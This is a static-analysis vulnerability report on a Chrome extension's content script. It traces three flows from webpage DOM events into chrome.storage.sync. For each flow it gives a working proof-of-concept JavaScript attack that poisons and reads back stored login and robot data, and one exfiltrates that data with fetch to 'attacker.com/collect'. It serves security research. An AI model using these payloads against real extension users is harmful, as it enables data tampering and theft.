# CoCo Analysis: cphlknehicehlpbhcikldpihnceoleci

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3

---

## Sink 1: document_eventListener_contentMsgEvent → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/cphlknehicehlpbhcikldpihnceoleci/opgen_generated_files/cs_0.js
Line 492: `document.addEventListener('contentMsgEvent', (res) => {`
Line 493: `if(res.detail && res.detail.type === eventName){`
Line 515: `chrome.storage.sync.set({ kkbot_info: res.detail.data }, () => {`

**Code:**

```javascript
// Content script (cs_0.js) - Entry point
function listenEventToPage(eventName, callback) {
  if(callback){
    document.addEventListener('contentMsgEvent', (res) => { // ← attacker-controlled via DOM event
      if(res.detail && res.detail.type === eventName){
        callback(res);
      }
    });
  }
}

// Storage write - stores attacker data
listenEventToPage('loginSuccess', (res) => {
  chrome.storage.sync.set({ kkbot_info: res.detail.data }, () => { // ← attacker-controlled data stored
    sendEventToPage('loginSuccess');
  });
});

// Storage read - retrieves and sends data back to webpage
listenEventToPage('loginInfo', () => {
  chrome.storage.sync.get(['kkbot_info'], (res) => {
    sendEventToPage('loginInfo', res.kkbot_info); // ← sends stored data back to attacker
  });
});

// sendEventToPage dispatches DOM event back to webpage
function sendEventToPage(eventName, data, callback) {
  const cEvt = new CustomEvent('msgEvent', { detail: { type: eventName, data } }); // ← attacker receives data
  document.dispatchEvent(cEvt);
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event listener - malicious webpage can dispatch custom events

**Attack:**

```javascript
// Malicious webpage code
// Step 1: Poison storage with attacker data
const poisonEvent = new CustomEvent('contentMsgEvent', {
  detail: {
    type: 'loginSuccess',
    data: {
      token: 'attacker_controlled_token',
      userId: 'malicious_user_id',
      apiKey: 'fake_api_key'
    }
  }
});
document.dispatchEvent(poisonEvent);

// Step 2: Retrieve poisoned data back
document.addEventListener('msgEvent', (e) => {
  if (e.detail.type === 'loginInfo') {
    console.log('Stolen data:', e.detail.data);
    // Send to attacker server
    fetch('https://attacker.com/collect', {
      method: 'POST',
      body: JSON.stringify(e.detail.data)
    });
  }
});

const retrieveEvent = new CustomEvent('contentMsgEvent', {
  detail: { type: 'loginInfo' }
});
document.dispatchEvent(retrieveEvent);
```

**Impact:** Complete storage exploitation chain - attacker can poison chrome.storage.sync with arbitrary data and retrieve it back. This allows data exfiltration and manipulation of extension state, potentially affecting all pages where the extension runs.

---

## Sink 2: document_eventListener_contentMsgEvent → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/cphlknehicehlpbhcikldpihnceoleci/opgen_generated_files/cs_0.js
Line 492: `document.addEventListener('contentMsgEvent', (res) => {`
Line 493: `if(res.detail && res.detail.type === eventName){`
Line 530: `kkbot_info['currentRobot'] = res.detail.data;`
Line 531: `chrome.storage.sync.set({ kkbot_info: JSON.stringify(kkbot_info) }, () => {`

**Code:**

```javascript
// Content script - stores attacker-controlled robot info
listenEventToPage('setRobotInfo', (res) => {
  chrome.storage.sync.get(['kkbot_info'], (storage) => {
    if(storage.kkbot_info){
      const kkbot_info = JSON.parse(storage.kkbot_info);
      kkbot_info['currentRobot'] = res.detail.data; // ← attacker-controlled
      chrome.storage.sync.set({ kkbot_info: JSON.stringify(kkbot_info) }, () => {
        sendEventToPage('setRobotInfo');
      });
    }
  });
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event listener

**Attack:**

```javascript
// Poison the currentRobot field
const robotEvent = new CustomEvent('contentMsgEvent', {
  detail: {
    type: 'setRobotInfo',
    data: {
      robotId: 'malicious_bot',
      config: 'attacker_controlled_config'
    }
  }
});
document.dispatchEvent(robotEvent);
```

**Impact:** Attacker can modify the robot configuration stored in chrome.storage.sync, potentially affecting extension behavior across all pages.

---

## Sink 3: document_eventListener_contentMsgEvent → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/cphlknehicehlpbhcikldpihnceoleci/opgen_generated_files/cs_0.js
Line 492: `document.addEventListener('contentMsgEvent', (res) => {`
Line 493: `if(res.detail && res.detail.type === eventName){`
Line 539: `chrome.storage.sync.set({ pluginRobotInfo: JSON.stringify(res.detail.data) }, () => {`

**Code:**

```javascript
// Content script - stores plugin robot info
listenEventToPage('setkkPluginRobotInfo', (res) => {
  chrome.storage.sync.set({ pluginRobotInfo: JSON.stringify(res.detail.data) }, () => { // ← attacker-controlled
    sendEventToPage('setkkPluginRobotInfo');
  });
});

// Retrieval path
listenEventToPage('getkkPluginRobotInfo', () => {
  chrome.storage.sync.get(['pluginRobotInfo'], (res) => {
    sendEventToPage('getkkPluginRobotInfo', res.pluginRobotInfo); // ← sends back to attacker
  });
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event listener

**Attack:**

```javascript
// Poison plugin robot info
const pluginEvent = new CustomEvent('contentMsgEvent', {
  detail: {
    type: 'setkkPluginRobotInfo',
    data: { model: 'attacker_model', settings: 'malicious_settings' }
  }
});
document.dispatchEvent(pluginEvent);

// Retrieve it back
document.addEventListener('msgEvent', (e) => {
  if (e.detail.type === 'getkkPluginRobotInfo') {
    console.log('Retrieved:', e.detail.data);
  }
});

const getEvent = new CustomEvent('contentMsgEvent', {
  detail: { type: 'getkkPluginRobotInfo' }
});
document.dispatchEvent(getEvent);
```

**Impact:** Complete storage exploitation - attacker can poison and retrieve pluginRobotInfo data through DOM events.
